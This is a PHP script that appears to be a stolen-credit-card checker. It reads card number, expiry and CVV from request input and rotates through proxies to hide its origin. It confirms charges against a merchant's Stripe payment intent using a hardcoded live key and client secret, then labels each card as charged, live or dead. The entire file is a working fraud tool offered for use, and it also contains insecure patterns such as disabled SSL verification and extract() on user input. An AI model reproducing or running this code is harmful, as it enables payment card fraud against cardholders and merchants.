<?php 
require 'function.php';
error_reporting(0);

//---------------------------------------//
$mtc_site = "example.com" ;
$amt = "1$" ;
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function random_strings($length_of_string) 
{
    $str_result1 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
    return substr(str_shuffle($str_result1),  
                       0, $length_of_string); 
}
$mail = 'mtctechx'.random_strings(6).'';
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
# -------------------- [1 REQ] -------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3Lp7q1H33cNy5iMP0iWT3FSN/confirm');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_intents/pi_3Lp7q1H33cNy5iMP0iWT3FSN/confirm h2',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: ',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=nexon+davis&payment_method_data[billing_details][address][city]=New+York&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=street+6&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][state]=NY&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][email]=nexon608%40gmail.com&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=5cb72056-e791-4f12-995c-f4e1f8ef83b3f67acc&payment_method_data[muid]=17504431-19d5-4c58-a4cc-bbc041093a9514e98b&payment_method_data[sid]=96eb5294-cbf4-42a0-8b9a-92f0c249a77812202c&payment_method_data[payment_user_agent]=stripe.js%2Fc4ea1a8ce%3B+stripe-js-v3%2Fc4ea1a8ce&payment_method_data[time_on_page]=49010&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_5194XEdH33cNy5iMPGgwHXIcaqRgcBpCqDumxJQPPHaq9TgEQMzySFdtGRRnyymI7DPReFu8uMboDNXX3FjwfXpzy00525IflN6&client_secret=pi_3Lp7q1H33cNy5iMP0iWT3FSN_secret_wDLdtvaBHhDWkNMrVoqSw9cw0');


$result1 = curl_exec($ch);

$id = trim(strip_tags(getStr($result11,'"id": "','"'))); 

//$pi = Getstr($result11,'client_secret":"','_secret');

//$src = Getstr($result11,'client_secret":"','"');

 /*$msg = trim(strip_tags(getStr($result1,'"error_message": "','"'))); 
$rsp = trim(strip_tags(getStr($result11,'"decline_code": "','"'))); 
echo ' message is     '.$rsp.' ';
echo ''.$result1.''; **/

# ---------------------------------------#

# ---------------- [Responses] ----------------- #
if(strpos($result1, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>result1: Payment Intent Confirmed ⚠️ </span><br>';

    }

elseif(strpos($result1, "succeeded")) {

    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span><br>result1:CHARGED '.$amt.' ✅ @nexonxn</span><br>';
exit;
}

elseif(strpos($result1, "Your card has insufficient funds.")) {

    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br> 𝗖𝗛𝗔𝗥𝗚𝗔𝗕𝗟𝗘 𝗖𝗔𝗥𝗗 ✅ <br>  𝗧𝗥𝗬 𝗙𝗢𝗥  𝗟𝗢𝗪 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 @nexonxn </span><br>';
    exit;
    }



elseif(strpos($result1, "incorrect_zip")) {

    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>result1: CVV LIVE ✅ @nexonxn </span><br>';
    exit;
    }

elseif(strpos($result1, 'security code is incorrect.')) {

    echo 'CCN </span>  </span>CC:  '.$lista.'</span>  <br>result1: 𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ✅ @nexonxn </span><br>';
    exit;
    }
    elseif(strpos($result1, 'security code is invalid.')) {

        echo 'CCN </span>  </span>CC:  '.$lista.'</span>  <br>result1: SECURITY CODE IS INCORRECT  ✅ @nexonxn </span><br>';
        exit;
        }
    elseif(strpos($result1, "Security code is incorrect")) {

    echo 'CCN </span>  </span>CC:  '.$lista.'</span>  <br>result1: 𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ✅ @nexonxn </span><br>';
    }
    
elseif(strpos($result1, "transaction_not_allowed")) {

    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>result1: TRANSACTION NOT ALLOWED ❌ @nexonxn </span><br>';
    exit;
    }
    

elseif(strpos($result1, "stripe_3ds2_fingerprint")) {


    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>result1: 3DSECURE REQUIRED @nexonxn </span><br>';
    exit;
    }
elseif(strpos($result1, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>result1: GENERIC DECLINE ❌ </span><br>';
    }

elseif(strpos($result1, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>result1: DO NOT HONOR ❌ </span><br>';

}


elseif(strpos($result1, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>result1: FRAUDULENT ❌ </span><br>';

}
elseif(strpos($result1, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>result1: Captcha ⚠️ </span><br>';

    }


elseif(strpos($result1, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>result1: Decline </span><br>';

}

else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>result1: CARD DECLINED ❌ </span><br>';

}

curl_close($ch);
ob_flush();
#echo $result11;
#echo $result1; 
?>